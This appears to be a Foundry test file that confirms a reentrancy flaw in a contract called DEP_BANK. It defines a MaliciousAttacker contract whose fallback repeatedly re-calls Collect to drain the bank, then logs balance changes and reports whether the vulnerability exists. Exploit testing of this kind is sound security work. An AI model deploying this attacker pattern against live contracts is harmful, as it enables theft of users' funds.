// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xaae1f51cf3339f18b6d3f3bdc75a5facd744b0b8.sol";

contract MockLogFile {
    function AddMessage(address, uint, string memory) public {
        // Do nothing to prevent reverts from logging
    }
}

contract MaliciousAttacker {
    DEP_BANK public bank;
    uint public remainingAttempts;

    constructor(address payable bankAddress) {
        bank = DEP_BANK(bankAddress);
    }

    function performAttack(uint amount, uint maxAttempts) external {
        remainingAttempts = maxAttempts;
        bank.Collect(amount);
    }

    fallback() external payable {
        remainingAttempts--;
        if (remainingAttempts > 0) {
            bank.Collect(msg.value);
        }
    }
}

contract ReentracyTest is Test {
    DEP_BANK public bank;
    MaliciousAttacker public attacker;
    MockLogFile public mockLog;

    function setUp() public {
        bank = new DEP_BANK();
        mockLog = new MockLogFile();
        bank.SetLogFile(address(mockLog));
        bank.SetMinSum(1 ether);
        attacker = new MaliciousAttacker(payable(address(bank)));
    }

    function testReentrancy() public {
        // Deposit funds for attacker
        vm.deal(address(attacker), 3 ether);
        vm.prank(address(attacker));
        bank.Deposit{value: 3 ether}();

        console.log("--- BEFORE-Trigger State ---");
        uint beforeBankETH = address(bank).balance;
        uint beforeAttackerETH = address(attacker).balance;
        uint beforeAttackerBankBal = bank.balances(address(attacker));
        
        console.log("Bank Contract Balance:", beforeBankETH);
        console.log("Attacker Contract Balance:", beforeAttackerETH);
        console.log("Attacker Bank Token Balance:", beforeAttackerBankBal);
        
        console.log("--- Trigger Reentrancy Attack ---");
        vm.prank(address(attacker));
        attacker.performAttack(1 ether, 3);
        console.log("Reentrancy attack executed");
        
        console.log("--- AFTER-Trigger State ---");
        uint afterBankETH = address(bank).balance;
        uint afterAttackerETH = address(attacker).balance;
        uint afterAttackerBankBal = bank.balances(address(attacker));
        
        console.log("Bank Contract Balance:", afterBankETH);
        console.log("Attacker Contract Balance:", afterAttackerETH);
        console.log("Attacker Bank Token Balance:", afterAttackerBankBal);
        
        // Differential state comparison
        console.log("--- State Change Verification ---");
        console.log("Bank Balance Change:", int(afterBankETH) - int(beforeBankETH));
        console.log("Attacker ETH Change:", int(afterAttackerETH) - int(beforeAttackerETH));
        console.log("Attacker Bank Token Change:", int(afterAttackerBankBal) - int(beforeAttackerBankBal));
        
        // Vulnerability determination
        bool bankDrained = afterBankETH == 0;
        bool attackerProfited = afterAttackerETH == beforeAttackerETH + beforeBankETH;
        bool internalBalanceMismatch = afterAttackerBankBal > 0; // Should be 0 with proper updates
        
        if (bankDrained && attackerProfited && internalBalanceMismatch) {
            console.log("Vulnerability Exists: Reentrancy attack successfully drained bank funds while maintaining incorrect internal token balance");
        } else {
            console.log("Vulnerability not Exist: Reentrancy attack failed to produce expected state changes");
        }
    }
}